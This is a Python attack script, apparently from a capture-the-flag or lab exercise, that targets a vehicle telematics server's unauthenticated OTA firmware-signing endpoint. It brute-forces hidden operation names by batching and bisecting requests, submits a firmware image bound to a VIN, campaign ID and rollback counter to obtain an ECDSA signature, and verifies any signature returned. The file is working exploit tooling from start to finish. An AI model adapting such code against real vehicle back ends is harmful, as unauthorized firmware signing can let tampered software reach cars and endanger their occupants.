#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""sign_vcu.py - task 07: the unauthorized OTA signing interface on the TSP.

WHAT WAS ESTABLISHED (see 04_SOLVE/sign/FINDINGS.md and 03_EVIDENCE/sign/):

  TSP  POST http://10.225.139.2:8080/graphql
  body {"query": "<text>", "variables": {<key>: <value>}}

  The endpoint is NOT a GraphQL engine.  It is a substring matcher:
    * the operation is selected by a substring of the raw "query" string
      ("xx vehicleDiagnostics yy" dispatches; "VEHICLEDIAGNOSTICS" does not);
    * the operation's argument is taken from the "variables" object.

  Registered operations (exhaustive: 30 859 candidate names tested):
    vehicleDiagnostics        variables.vin  -> this vehicle's OTA diagnostics
    signFirmwareUpdate        variables.vin  -> OTA signing (task 07 target)
    assignFirmwareUpdate      variables.vin  -> same handler
    countersignFirmwareUpdate variables.vin  -> same handler
    cosignFirmwareUpdate      variables.vin  -> same handler

  All four *_FirmwareUpdate names hit the same handler, which answers:
    variables {}                  -> {"errors":[{"message":"vehicle campaign not found"}]}
    variables {vin: <real VIN>}   -> {"errors":[{"message":"update campaign validation failed"}]}
    variables {vin: <any other>}  -> {"errors":[{"message":"vehicle campaign not found"}]}

  So the interface IS found and IS unauthenticated, but a server-side
  "update campaign" gate is closed for this campaign and no request-side value,
  header, host, method, shape or type opens it (see the evidence files).

SUBCOMMANDS
  discover   re-run the operation inventory (shotgun + bisect)
  bind       submit the VIN+campaign+rollback binding request and report what
             the server says (this is the task-07 submission itself)
  verify     independently verify a returned signature over a message file
"""
import argparse
import base64
import hashlib
import json
import os
import sys

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, "..", ".."))
EV = os.path.join(ROOT, "03_EVIDENCE", "sign")
URL = "http://10.225.139.2:8080/graphql"
TBOX = "http://10.225.139.3:8080"

VIN = "CV622697F82A936A1"
CAMPAIGN = "CAMP-243892C376D4CB2D5F826953"
FW_PATH = os.path.join(ROOT, "work", "bundle2", "x", "vcu-reference.bin")
GUEST = '{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
GATE = "update campaign validation failed"
NOT_FOUND = "vehicle campaign not found"

OPS = ["vehicleDiagnostics", "signFirmwareUpdate", "assignFirmwareUpdate",
       "countersignFirmwareUpdate", "cosignFirmwareUpdate"]


# --------------------------------------------------------------------------- #
def load_fw():
    if not os.path.exists(FW_PATH):
        sys.exit(f"[!] missing {FW_PATH} (re-download the engineering bundle)")
    raw = open(FW_PATH, "rb").read()
    return raw, hashlib.sha256(raw).hexdigest(), base64.b64encode(raw).decode()


def gql(query, variables, timeout=15):
    r = requests.post(URL, json={"query": query, "variables": variables}, timeout=timeout)
    return r.status_code, r.text.strip()


# --------------------------------------------------------------------------- #
def cmd_discover(args):
    """Shotgun the name space: 45 names per request, bisect any non-guest chunk."""
    raw, sha, b64 = load_fw()
    names = set()
    for stem in ("sign", "assign", "countersign", "cosign", "signature",
                 "prepare", "create", "issue", "commit", "authorize", "approve",
                 "validate", "commit", "finalize", "update", "get"):
        for noun in ("FirmwareUpdate", "VehicleUpdate", "OtaUpdate", "VcuUpdate",
                     "Update", "Firmware", "Campaign", "UpdateCampaign",
                     "CampaignUpdate", "Signature", "UpdateSignature"):
            names.add(stem + noun)
    names |= set(OPS)
    names = sorted(names)
    vars_all = {"vin": VIN, "campaignId": CAMPAIGN, "rollback": 2,
                "firmware": b64, "sha256": sha, "size": len(raw),
                "address": "0x08040000"}
    chunks = [names[i:i + 45] for i in range(0, len(names), 45)]
    hits = []
    for ch in chunks:
        st, txt = gql(" ".join(ch), vars_all)
        if txt == GUEST:
            continue
        cand = ch
        while len(cand) > 1:
            mid = len(cand) // 2
            a, b = cand[:mid], cand[mid:]
            cand = a if gql(" ".join(a), vars_all)[1] != GUEST else b
        st, txt = gql(cand[0], vars_all)
        hits.append((cand[0], st, txt[:120]))
        print(f"  HIT {cand[0]:28s} {st} {txt[:110]}")
    print(f"[*] {len(names)} names, {len(chunks)} requests, {len(hits)} ops")
    return hits


def cmd_bind(args):
    """The task-07 submission: bind the VCU reference firmware to
    VIN + campaign + rollback=2 and ask for the ECDSA P-256/SHA-256 signature."""
    raw, sha, b64 = load_fw()
    print(f"[*] firmware        {FW_PATH} ({len(raw)} B)")
    print(f"[*] sha256          {sha}")
    print(f"[*] target VIN      {VIN}")
    print(f"[*] campaign        {CAMPAIGN}")
    print(f"[*] rollback        2   (manifest vcuRollback=2)")

    # the full binding payload, every plausible key name at once
    variables = {
        "vin": VIN,
        "campaignId": CAMPAIGN,
        "campaign": CAMPAIGN,
        "rollback": 2,
        "vcuRollback": 2,
        "rollbackCounter": 2,
        "firmware": b64,
        "firmwareBase64": b64,
        "vcuReference": b64,
        "image": b64,
        "sha256": sha,
        "firmwareSha256": sha,
        "digest": sha,
        "size": len(raw),
        "vcuReferenceSize": len(raw),
        "address": "0x08040000",
        "vcuUpdateAddress": "0x08040000",
    }
    for op in ("signFirmwareUpdate", "assignFirmwareUpdate", "countersignFirmwareUpdate",
               "cosignFirmwareUpdate"):
        st, txt = gql(op, variables)
        print(f"\n[{op}] http={st}")
        print(f"  {txt}")
        if txt == GUEST:
            print("  -> not dispatched (guest fallback)")
        elif GATE in txt:
            print("  -> dispatched; blocked by the server-side update-campaign gate")
        elif "signature" in txt.lower():
            print("  -> SIGNATURE RETURNED, run: sign_vcu.py verify ...")
            print(json.dumps(json.loads(txt), indent=2)[:2000])
    # baseline / control pair, so the transcript proves the diagnosis
    print("\n[control] vehicleDiagnostics + real VIN")
    print("  " + gql("vehicleDiagnostics", {"vin": VIN})[1][:160])
    print("[control] signFirmwareUpdate + no variables")
    print("  " + gql("signFirmwareUpdate", {})[1])
    print("[control] signFirmwareUpdate + foreign VIN")
    print("  " + gql("signFirmwareUpdate", {"vin": "CV6FF52FEE9EDDD86"})[1])


def cmd_verify(args):
    """Independent ECDSA P-256 / SHA-256 verification (no trust in the server)."""
    msg = open(args.message, "rb").read()
    sig_hex = args.signature.strip()
    sig = bytes.fromhex(sig_hex) if all(c in "0123456789abcdefABCDEF" for c in sig_hex) else None
    if sig is None:
        sig = base64.b64decode(sig_hex)
    pub = open(args.pubkey, "rb").read()
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import ec, utils
        key = serialization.load_pem_public_key(pub)
        print(f"[*] key: {key.curve.name} ({key.key_size}-bit)")
        ok = False
        # try DER, then raw r||s
        for label, s in (("DER", sig), ("raw r||s", sig)):
            try:
                if label == "raw r||s" and len(sig) == 64:
                    r = int.from_bytes(sig[:32], "big")
                    s_ = int.from_bytes(sig[32:], "big")
                    d = utils.encode_dss_signature(r, s_)
                elif label == "DER":
                    d = sig
                else:
                    continue
                key.verify(d, msg, ec.ECDSA(hashes.SHA256()))
                print(f"[+] VERIFIED with ECDSA P-256 / SHA-256, signature encoding = {label}")
                ok = True
                break
            except Exception as e:
                print(f"[-] {label}: {type(e).__name__}: {e}")
        print(f"[*] message {len(msg)} B sha256={hashlib.sha256(msg).hexdigest()}")
        return 0 if ok else 1
    except ImportError:
        print("[!] pip install cryptography")
        return 2


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd")
    sub.add_parser("discover", help="enumerate the matcher's operations")
    sub.add_parser("bind", help="submit the VIN+campaign+rollback binding request")
    v = sub.add_parser("verify", help="verify a signature offline")
    v.add_argument("--message", required=True, help="file holding the signed bytes")
    v.add_argument("--signature", required=True, help="signature hex or base64")
    v.add_argument("--pubkey", required=True, help="PEM public key")
    a = ap.parse_args()
    if a.cmd == "discover":
        cmd_discover(a)
    elif a.cmd == "bind":
        cmd_bind(a)
    elif a.cmd == "verify":
        sys.exit(cmd_verify(a))
    else:
        ap.print_help()


if __name__ == "__main__":
    main()
